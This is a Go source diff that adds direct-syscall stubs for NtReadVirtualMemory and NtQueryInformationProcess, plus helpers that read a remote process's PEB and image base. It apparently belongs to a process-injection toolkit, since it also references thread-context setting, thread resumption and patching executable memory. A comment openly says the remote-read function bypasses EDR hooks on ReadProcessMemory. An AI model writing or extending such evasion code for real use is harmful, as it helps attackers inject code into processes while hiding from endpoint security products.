@@ -22,6 +22,12 @@ const (
 )
 
 var (
+	hgNtReadVirtualMemoryOnce sync.Once
+	hgNtReadVirtualMemoryProc *HGProc
+
+	hgNtQueryProcessOnce sync.Once
+	hgNtQueryProcessProc *HGProc
+
 	hgNtResumeThreadOnce sync.Once
 	hgNtResumeThreadProc *HGProc
 
@@ -70,6 +76,20 @@ var (
 	hgNtSetContextThreadOnce sync.Once
 	hgNtSetContextThreadProc *HGProc
 )
+
+func getNtReadVirtualMemoryProc() *HGProc {
+	hgNtReadVirtualMemoryOnce.Do(func() {
+		hgNtReadVirtualMemoryProc = NewHGProc("NtReadVirtualMemory")
+	})
+	return hgNtReadVirtualMemoryProc
+}
+
+func getNtQueryProcessProc() *HGProc {
+	hgNtQueryProcessOnce.Do(func() {
+		hgNtQueryProcessProc = NewHGProc("NtQueryInformationProcess")
+	})
+	return hgNtQueryProcessProc
+}
 
 func getNtResumeThreadProc() *HGProc {
 	hgNtResumeThreadOnce.Do(func() {
@@ -380,6 +400,72 @@ func NtGetNextThread(processHandle uintptr, prevThread uintptr, accessMask uint3
 		return 0
 	}
 	return newThread
+}
+
+// NtReadRemote reads from processHandle:src into dst via a direct
+// NtReadVirtualMemory syscall stub (bypasses ReadProcessMemory EDR hooks).
+func NtReadRemote(processHandle uintptr, src uintptr, dst []byte) bool {
+	p := getNtReadVirtualMemoryProc()
+	if p == nil || len(dst) == 0 {
+		return false
+	}
+	var read uintptr
+	r, _, _ := p.Call(
+		processHandle,
+		src,
+		uintptr(unsafe.Pointer(&dst[0])),
+		uintptr(len(dst)),
+		uintptr(unsafe.Pointer(&read)),
+	)
+	return r == 0
+}
+
+// ProcessPEB returns the PEB base address of processHandle via
+// NtQueryInformationProcess(ProcessBasicInformation).
+//
+// PROCESS_BASIC_INFORMATION layout (x64):
+//
+//	+0x00  ExitStatus     (NTSTATUS, 4 bytes; padded to 8 by alignment)
+//	+0x08  PebBaseAddress (PPEB)
+//	+0x10  AffinityMask   (ULONG_PTR)
+//	+0x18  BasePriority   (LONG)
+//	+0x20  UniqueProcessId
+//	+0x28  InheritedFromUniqueProcessId
+func ProcessPEB(processHandle uintptr) uintptr {
+	p := getNtQueryProcessProc()
+	if p == nil {
+		return 0
+	}
+	var pbi [6]uintptr // 6 × 8 = 48 bytes = sizeof(PROCESS_BASIC_INFORMATION) on x64
+	var retLen uint32
+	r, _, _ := p.Call(
+		processHandle,
+		0, // ProcessBasicInformation
+		uintptr(unsafe.Pointer(&pbi[0])),
+		uintptr(unsafe.Sizeof(pbi)),
+		uintptr(unsafe.Pointer(&retLen)),
+	)
+	if r != 0 {
+		return 0
+	}
+	return pbi[1] // PebBaseAddress at offset 0x08
+}
+
+// ProcessImageBase reads PEB.ImageBaseAddress (PEB+0x10) from processHandle.
+func ProcessImageBase(processHandle uintptr) uintptr {
+	peb := ProcessPEB(processHandle)
+	if peb == 0 {
+		return 0
+	}
+	var buf [8]byte
+	if !NtReadRemote(processHandle, peb+0x10, buf[:]) {
+		return 0
+	}
+	var base uintptr
+	for i, b := range buf {
+		base |= uintptr(b) << (uint(i) * 8)
+	}
+	return base
 }
 
 // ntFlush flushes the CPU instruction cache after patching executable memory.
